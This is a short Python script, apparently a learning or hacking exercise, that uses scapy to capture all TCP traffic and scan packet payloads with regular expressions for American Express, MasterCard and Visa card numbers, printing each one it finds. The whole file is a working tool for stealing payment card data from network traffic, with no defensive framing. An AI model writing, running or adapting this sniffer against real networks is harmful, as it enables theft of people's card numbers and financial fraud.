from __future__ import print_function
import re

from scapy.all import *

def find_credit_card(packet):
    raw = packet.sprintf('%Raw.load%')
    america_re = re.findall('3[47][0-9]{13}', raw)
    master_re = re.findall('5[1-5][0-9]{14}', raw)
    visa_re = re.findall('4[0-9][0-9]{12}(?:[0-9]{3})?', raw)

    if america_re:
        print("Founc American Express Card: ", america_re[0])
    if master_re:
        print("Founc MasterCard Card: ", master_re[0])
    if visa_re:
        print("Founc Visa Card: ", visa_re[0])

def main():
    print("Starting Credit Card Sniffer")
    sniff(filter="tcp", prn=find_credit_card, store=0)

if __name__ == '__main__':
    main()
